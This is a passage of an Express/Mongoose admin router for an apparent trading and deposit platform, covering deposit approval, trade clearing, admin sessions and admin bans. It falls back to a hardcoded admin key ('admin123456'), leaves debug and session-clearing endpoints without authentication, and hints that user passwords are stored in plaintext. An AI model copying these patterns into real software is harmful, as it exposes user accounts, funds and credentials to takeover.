        .status(400)
        .json({ error: "Invalid action. Use 'approve' or 'reject'" });
    }

    user.markModified("depositRequests");
    user.markModified("transactions");
    user.markModified("notifications");
    await user.save();

    res.json({
      success: true,
      message: `Deposit ${action}d successfully`,
      newBalance: user.balance,
      requestStatus: request.status,
    });
  } catch (err) {
    console.error("Error in approve-deposit:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= CLEAR COMPLETED TRADES ONLY (ADMIN ONLY) =================
router.delete("/admin/clear-completed-trades", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    // Get all users
    const users = await User.find({});
    let totalCleared = 0;

    for (const user of users) {
      if (user.pendingTrades && user.pendingTrades.length > 0) {
        const originalLength = user.pendingTrades.length;
        // Keep only pending trades, remove won/lost/frozen
        user.pendingTrades = user.pendingTrades.filter(
          (trade) => trade.status === "pending",
        );
        user.binaryTrades = []; // Clear old binaryTrades
        totalCleared += originalLength - user.pendingTrades.length;
        await user.save();
      }
    }

    res.json({
      success: true,
      message: `Cleared ${totalCleared} completed trades`,
      clearedCount: totalCleared,
    });
  } catch (err) {
    console.error("Error clearing completed trades:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= DEBUG - FORCE DELETE ALL =================
router.delete("/debug/force-delete-all/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    // Try direct database command
    const db = mongoose.connection.db;
    const collection = db.collection("users");

    const result = await collection.updateOne(
      { username: username },
      { $set: { notifications: [] } },
    );

    console.log("Direct DB update result:", result);

    // Verify
    const user = await collection.findOne({ username: username });
    console.log("After direct update - notifications:", user?.notifications);

    res.json({
      success: true,
      result: result,
      currentNotifications: user?.notifications || [],
    });
  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= MASTER ADMIN SESSION MANAGEMENT =================

// REGISTER ADMIN SESSION - Called when admin panel loads
router.post("/admin/register-session", async (req, res) => {
  try {
    const { adminKey, userAgent, adminUsername } = req.body; // ADD adminUsername
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }

    const sessionId = generateSessionId();
    const ipAddress = getClientIp(req);
    const deviceInfo = getDeviceInfo(userAgent);
    const browser = getBrowserInfo(userAgent);

    // Find or create master admin user
    let masterAdmin = await User.findOne({ username: "master_admin" });

    if (!masterAdmin) {
      masterAdmin = new User({
        username: "master_admin",
        email: "master@admin.local",
        isMasterAdmin: true,
        adminSessions: [],
      });
    }

    // Ensure adminSessions array exists
    if (!masterAdmin.adminSessions) masterAdmin.adminSessions = [];

    // Add new session - STORE THE ADMIN USERNAME
    masterAdmin.adminSessions.push({
      sessionId,
      ipAddress: ipAddress,
      userAgent: userAgent || "Unknown",
      deviceInfo: `${browser} - ${deviceInfo}`,
      loggedInAt: new Date(),
      lastActiveAt: new Date(),
      isActive: true,
      sessionUser: adminUsername || "master_admin", // USE THE PROVIDED USERNAME
    });

    // Keep only last 50 sessions
    if (masterAdmin.adminSessions.length > 50) {
      masterAdmin.adminSessions = masterAdmin.adminSessions.slice(-50);
    }

    await masterAdmin.save();

    res.json({
      success: true,
      sessionId,
      message: "Admin session registered",
    });
  } catch (err) {
    console.error("Error registering admin session:", err);
    res.status(500).json({ error: err.message });
  }
});

// GET ALL ACTIVE ADMIN SESSIONS
router.get("/admin/sessions", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }

    const masterAdmin = await User.findOne({ username: "master_admin" });

    if (!masterAdmin) {
      return res.json({ sessions: [] });
    }

    const sessions = (masterAdmin.adminSessions || [])
      .sort((a, b) => new Date(b.lastActiveAt) - new Date(a.lastActiveAt))
      .map((s) => ({
        sessionId: s.sessionId,
        ipAddress: s.ipAddress,
        deviceInfo: s.deviceInfo,
        loggedInAt: s.loggedInAt,
        lastActiveAt: s.lastActiveAt,
        isActive: s.isActive !== false, // Show true/false
      }));

    res.json({ sessions });
  } catch (err) {
    console.error("Error fetching admin sessions:", err);
    res.status(500).json({ error: err.message });
  }
});

// SESSION HEARTBEAT - Keep session alive
router.post("/admin/session-heartbeat", async (req, res) => {
  try {
    const { sessionId } = req.body;

    if (!sessionId) {
      return res.status(400).json({ error: "Session ID required" });
    }

    const masterAdmin = await User.findOne({
      username: "master_admin",
      "adminSessions.sessionId": sessionId,
      "adminSessions.isActive": true,
    });

    if (masterAdmin) {
      const session = masterAdmin.adminSessions.find(
        (s) => s.sessionId === sessionId,
      );
      if (session) {
        session.lastActiveAt = new Date();
        await masterAdmin.save();
      }
    }

    res.json({ success: true });
  } catch (err) {
    console.error("Error updating session heartbeat:", err);
    res.status(500).json({ error: err.message });
  }
});

// REVOKE (KICK) A SPECIFIC SESSION
router.delete("/admin/sessions/:sessionId", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { sessionId } = req.params;

    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }

    const masterAdmin = await User.findOne({ username: "master_admin" });

    if (!masterAdmin) {
      return res.status(404).json({ error: "Master admin not found" });
    }

    // Find and mark session as inactive
    const session = masterAdmin.adminSessions.find(
      (s) => s.sessionId === sessionId,
    );
    if (session) {
      session.isActive = false;
      session.kickedAt = new Date();
      await masterAdmin.save();
    }

    // Also add to a kicked sessions list for real-time check
    if (!masterAdmin.kickedSessions) masterAdmin.kickedSessions = [];
    masterAdmin.kickedSessions.push({
      sessionId: sessionId,
      kickedAt: new Date(),
    });
    await masterAdmin.save();

    res.json({
      success: true,
      message: "Session revoked",
      sessionId: sessionId,
    });
  } catch (err) {
    console.error("Error revoking session:", err);
    res.status(500).json({ error: err.message });
  }
});

// REVOKE ALL OTHER SESSIONS - Only revoke ACTIVE sessions
router.post("/admin/revoke-others", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { currentSessionId } = req.body;
    
    console.log("🔴 Revoke others called with sessionId:", currentSessionId);
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    
    const masterAdmin = await User.findOne({ username: "master_admin" });
    
    if (!masterAdmin) {
      return res.status(404).json({ error: "Master admin not found" });
    }
    
    console.log(`📊 Total sessions before: ${masterAdmin.adminSessions.length}`);
    
    let revokedCount = 0;
    
    // Only revoke ACTIVE sessions (isActive !== false)
    masterAdmin.adminSessions.forEach(session => {
      if (session.sessionId !== currentSessionId && session.isActive !== false) {
        session.isActive = false;
        session.revokedAt = new Date();
        revokedCount++;
        console.log(`Revoked active session: ${session.sessionId?.slice(0, 20)}...`);
      }
    });
    
    masterAdmin.markModified('adminSessions');
    await masterAdmin.save();
    
    console.log(`✅ Revoked ${revokedCount} active sessions`);
    
    res.json({ 
      success: true, 
      message: `Revoked ${revokedCount} other active sessions`,
      revokedCount: revokedCount
    });
    
  } catch (err) {
    console.error("Error revoking other sessions:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN USER MANAGEMENT =================

// GET ALL ADMIN USERS (users with role = "admin")
router.get("/admin/all-admins", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const admins = await User.find({ role: "admin" }).select(
      "-password -plainPassword",
    );

    res.json({ admins });
  } catch (err) {
    console.error("Error fetching admins:", err);
    res.status(500).json({ error: err.message });
  }
});

// KICK ADMIN - Force logout immediately (session invalidation)
router.post("/admin/kick-admin", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { adminUsername } = req.body;

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    if (!adminUsername) {
      return res.status(400).json({ error: "Admin username required" });
    }

    // Don't allow kicking yourself
    const currentAdmin = await User.findOne({
      username: adminKey === validAdminKey ? "master_admin" : "admin",
    });
    if (currentAdmin?.username === adminUsername) {
      return res.status(400).json({ error: "You cannot kick yourself" });
    }

    const admin = await User.findOne({
      username: adminUsername.toLowerCase().trim(),
      role: "admin",
    });

    if (!admin) {
      return res.status(404).json({ error: "Admin user not found" });
    }

    // Invalidate all active sessions for this admin
    if (admin.adminSessions && admin.adminSessions.length > 0) {
      admin.adminSessions.forEach((session) => {
        session.isActive = false;
        session.kickedAt = new Date();
        session.kickedBy = adminKey;
      });
      await admin.save();
    }

    // Also add to a kicked sessions list for real-time check
    const masterAdmin = await User.findOne({ username: "master_admin" });
    if (masterAdmin) {
      if (!masterAdmin.kickedAdmins) masterAdmin.kickedAdmins = [];
      masterAdmin.kickedAdmins.push({
        adminUsername: admin.username,
        kickedAt: new Date(),
        kickedBy: "master_admin",
      });
      await masterAdmin.save();
    }

    res.json({
      success: true,
      message: `Admin @${adminUsername} has been kicked out. They will need to login again.`,
    });
  } catch (err) {
    console.error("Error kicking admin:", err);
    res.status(500).json({ error: err.message });
  }
});

// BAN ADMIN - Permanently block from admin panel
router.post("/admin/ban-admin", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { adminUsername, banReason } = req.body;

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    if (!adminUsername) {
      return res.status(400).json({ error: "Admin username required" });
    }

    // Don't allow banning yourself
    if (adminUsername === "master_admin") {
      return res.status(400).json({ error: "Cannot ban the master admin" });
    }

    const admin = await User.findOne({
      username: adminUsername.toLowerCase().trim(),
      role: "admin",
    });

    if (!admin) {
      return res.status(404).json({ error: "Admin user not found" });
    }

    // Ban the admin
    admin.isAdminBanned = true;
    admin.adminBanReason = banReason || "No reason provided";
    admin.adminBannedAt = new Date();
    admin.role = "user"; // Demote from admin to user

    // Invalidate all sessions
    if (admin.adminSessions) {
      admin.adminSessions.forEach((session) => {
        session.isActive = false;
        session.bannedAt = new Date();
      });
    }

    await admin.save();

    // Log the ban in master admin records
    const masterAdmin = await User.findOne({ username: "master_admin" });
    if (masterAdmin) {
      if (!masterAdmin.bannedAdmins) masterAdmin.bannedAdmins = [];
      masterAdmin.bannedAdmins.push({
        adminUsername: admin.username,
        adminEmail: admin.email,
        bannedAt: new Date(),
        bannedBy: "master_admin",
        banReason: banReason || "No reason provided",
      });
      await masterAdmin.save();
    }

    res.json({
      success: true,
      message: `Admin @${adminUsername} has been BANNED from admin panel. They can no longer access.`,
      bannedAdmin: {
        username: admin.username,
        email: admin.email,
        bannedAt: admin.adminBannedAt,
        reason: admin.adminBanReason,
      },
    });
  } catch (err) {
    console.error("Error banning admin:", err);
    res.status(500).json({ error: err.message });
  }
});

// UNBAN ADMIN - Restore admin access
router.post("/admin/unban-admin", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { adminUsername } = req.body;

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    if (!adminUsername) {
      return res.status(400).json({ error: "Admin username required" });
    }

    const admin = await User.findOne({
      username: adminUsername.toLowerCase().trim(),
    });

    if (!admin) {
      return res.status(404).json({ error: "Admin user not found" });
    }

    // Unban the admin
    admin.isAdminBanned = false;
    admin.adminUnbannedAt = new Date();
    admin.role = "admin"; // Restore admin role

    await admin.save();

    // Update master admin records
    const masterAdmin = await User.findOne({ username: "master_admin" });
    if (masterAdmin && masterAdmin.bannedAdmins) {
      const banRecord = masterAdmin.bannedAdmins.find(
        (b) => b.adminUsername === admin.username,
      );
      if (banRecord) {
        banRecord.unbannedAt = new Date();
        banRecord.unbannedBy = "master_admin";
        await masterAdmin.save();
      }
    }

    res.json({
      success: true,
      message: `Admin @${adminUsername} has been UNBANNED. They can now access the admin panel again.`,
    });
  } catch (err) {
    console.error("Error unbanning admin:", err);
    res.status(500).json({ error: err.message });
  }
});

// GET BANNED ADMINS LIST
router.get("/admin/banned-admins", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const bannedAdmins = await User.find({
      isAdminBanned: true,
      role: { $ne: "admin" }, // Previously admins who are now banned
    }).select("-password -plainPassword");

    res.json({ bannedAdmins });
  } catch (err) {
    console.error("Error fetching banned admins:", err);
    res.status(500).json({ error: err.message });
  }
});

// MIDDLEWARE: Check if admin is banned (add to all admin routes)
// MIDDLEWARE: Check if admin is banned
router.use("/admin", async (req, res, next) => {
  // Skip for these routes
  if (
    req.path === "/admin/login" ||
    req.path === "/admin/register-session" ||
    req.path === "/admin/check-session" ||
    req.path === "/admin/all-with-plain-passwords"
  ) {
    // Allow this for initial load
    return next();
  }

  // Also skip if it's a GET request for sessions or admins (handled by master admin only)
  if (
    req.path === "/admin/sessions" ||
    req.path === "/admin/all-admins" ||
    req.path === "/admin/banned-admins"
  ) {
    return next();
  }

  const sessionId = req.headers["x-session-id"];

  if (sessionId) {
    try {
      const masterAdmin = await User.findOne({ username: "master_admin" });
      if (masterAdmin && masterAdmin.adminSessions) {
        const session = masterAdmin.adminSessions.find(
          (s) => s.sessionId === sessionId,
        );
        if (session && session.sessionUser) {
          const adminUser = await User.findOne({
            username: session.sessionUser,
          });
          if (adminUser && adminUser.isAdminBanned) {
            return res.status(403).json({
              error: "ADMIN_BANNED",
              message:
                "Your admin access has been revoked. Contact master admin.",
              bannedAt: adminUser.adminBannedAt,
              reason: adminUser.adminBanReason,
            });
          }
        }
      }
    } catch (err) {
      console.error("Middleware error:", err);
    }
  }

  next();
});

// DEBUG - Check sessions
router.get("/admin/debug-sessions", async (req, res) => {
  try {
    const masterAdmin = await User.findOne({ username: "master_admin" });
    if (!masterAdmin) {
      return res.json({ sessions: [] });
    }

    const sessions = masterAdmin.adminSessions.map((s) => ({
      sessionId: s.sessionId?.slice(0, 20) + "...",
      isActive: s.isActive,
      lastActiveAt: s.lastActiveAt,
    }));

    res.json({ sessions, total: masterAdmin.adminSessions.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// TEMPORARY - Clear all sessions (REMOVE AFTER USE)
router.post("/admin/temp-clear-sessions", async (req, res) => {
  try {
    const masterAdmin = await User.findOne({ username: "master_admin" });
    if (!masterAdmin) return res.json({ error: "Not found" });

    const count = masterAdmin.adminSessions?.length || 0;
    masterAdmin.adminSessions = [];
    await masterAdmin.save();

    res.json({ success: true, cleared: count });
  } catch (err) {
    res.json({ error: err.message });
  }
});


// CLEANUP - Remove old inactive sessions (older than 1 hour)
router.post("/admin/cleanup-sessions", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    
    const masterAdmin = await User.findOne({ username: "master_admin" });
    
    if (!masterAdmin) {
      return res.status(404).json({ error: "Master admin not found" });
    }
    
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    const beforeCount = masterAdmin.adminSessions.length;
    
    // Remove inactive sessions older than 1 hour
    masterAdmin.adminSessions = masterAdmin.adminSessions.filter(session => {
      if (session.isActive === false && session.revokedAt) {
        return new Date(session.revokedAt) > oneHourAgo;
      }
      return true;
    });
    
    const afterCount = masterAdmin.adminSessions.length;
    const cleanedCount = beforeCount - afterCount;
    
    await masterAdmin.save();
    
    console.log(`🧹 Cleaned up ${cleanedCount} old inactive sessions`);
    
    res.json({ 
      success: true, 
      cleaned: cleanedCount,
      remaining: afterCount
    });
    
  } catch (err) {
    console.error("Error cleaning up sessions:", err);
    res.status(500).json({ error: err.message });
  }
});


// CLEAR ALL SESSIONS (Emergency - logs out everyone)
router.post("/admin/clear-all-sessions", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    
    const masterAdmin = await User.findOne({ username: "master_admin" });
    
    if (!masterAdmin) {
      return res.status(404).json({ error: "Master admin not found" });
    }
    
    const count = masterAdmin.adminSessions.length;
    masterAdmin.adminSessions = [];
    await masterAdmin.save();
    
    console.log(`🔴 Cleared ALL ${count} admin sessions`);
    
    res.json({ 
      success: true, 
      message: `Cleared all ${count} admin sessions`
    });
    
  } catch (err) {
    console.error("Error clearing all sessions:", err);
    res.status(500).json({ error: err.message });
  }
});



// ================= BAN ADMIN USER =================
router.post("/admin/ban-user", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { sessionId, username, banReason } = req.body;
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    
    if (!sessionId && !username) {
      return res.status(400).json({ error: "Session ID or username required" });
    }
    
    let targetUser;
    
    // Find user by session ID or username
    if (sessionId) {
      const masterAdmin = await User.findOne({ username: "master_admin" });
      if (masterAdmin && masterAdmin.adminSessions) {
        const session = masterAdmin.adminSessions.find(s => s.sessionId === sessionId);
        if (session && session.sessionUser) {
          targetUser = await User.findOne({ username: session.sessionUser });
        }
      }
    }
    
    if (!targetUser && username) {
      targetUser = await User.findOne({ username: username.toLowerCase().trim() });
    }
    
    if (!targetUser) {
      return res.status(404).json({ error: "User not found" });
    }
    
    // Can't ban master admin
    if (targetUser.isMasterAdmin) {
      return res.status(400).json({ error: "Cannot ban the master admin" });
    }
    
    // Ban the user
    targetUser.isAdminBanned = true;
    targetUser.adminBanReason = banReason || "Banned by master admin";
    targetUser.adminBannedAt = new Date();
    targetUser.role = "user"; // Demote from admin
    
    // Invalidate all their sessions
    if (targetUser.adminSessions) {
      targetUser.adminSessions.forEach(s => {
        s.isActive = false;
        s.bannedAt = new Date();
      });
      targetUser.markModified('adminSessions');
    }
    
    await targetUser.save();
    
    // Also remove their sessions from master_admin list
    const masterAdmin = await User.findOne({ username: "master_admin" });
    if (masterAdmin && masterAdmin.adminSessions) {
      masterAdmin.adminSessions = masterAdmin.adminSessions.filter(s => {
        const shouldKeep = s.sessionUser !== targetUser.username;
        if (!shouldKeep) {
          console.log(`Removed session for banned user: ${targetUser.username}`);
        }
        return shouldKeep;
      });
      masterAdmin.markModified('adminSessions');
      await masterAdmin.save();
    }
    
    console.log(`🚫 User ${targetUser.username} has been banned from admin panel`);
    
    res.json({ 
      success: true, 
      message: `${targetUser.username} has been banned from admin panel`,
      bannedUser: {
        username: targetUser.username,
        email: targetUser.email,
        bannedAt: targetUser.adminBannedAt,
        reason: targetUser.adminBanReason
      }
    });
    
  } catch (err) {
    console.error("Error banning user:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= UNBAN ADMIN USER =================
router.post("/admin/unban-user", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    const { username } = req.body;
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    
    if (!username) {
      return res.status(400).json({ error: "Username required" });
    }
    
    const user = await User.findOne({ username: username.toLowerCase().trim() });
    
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    user.isAdminBanned = false;
    user.adminUnbannedAt = new Date();
    user.role = "admin"; // Restore admin role
    
    await user.save();
    
    console.log(`✅ User ${user.username} has been unbanned from admin panel`);
    
    res.json({ 
      success: true, 
      message: `${user.username} has been unbanned and can access admin panel again`
    });
    
  } catch (err) {
    console.error("Error unbanning user:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET BANNED USERS =================
router.get("/admin/banned-users", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";
    
    if (!adminKey || adminKey !== validAdminKey) {
      return res.status(401).json({ error: "Unauthorized" });
    }
    
    const bannedUsers = await User.find({ 
      isAdminBanned: true 
    }).select("-password -plainPassword");
    
    res.json({ bannedUsers });
    
  } catch (err) {
    console.error("Error fetching banned users:", err);
    res.status(500).json({ error: err.message });
  }
});
export default router;
